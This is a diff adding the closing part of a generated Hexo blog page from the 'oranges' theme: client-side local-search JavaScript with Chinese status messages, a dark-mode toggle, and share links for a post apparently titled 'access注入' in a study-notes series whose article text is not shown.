+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + access%E6%B3%A8%E5%85%A5 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F01%2F01%2Fcrecar%25E5%25AD%25A6%25E4%25B9%25A0%25E7%25AC%2594%25E8%25AE%25B0%2F4.access%25E6%25B3%25A8%25E5%2585%25A5%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/01/01/crecar%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4.access%E6%B3%A8%E5%85%A5/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
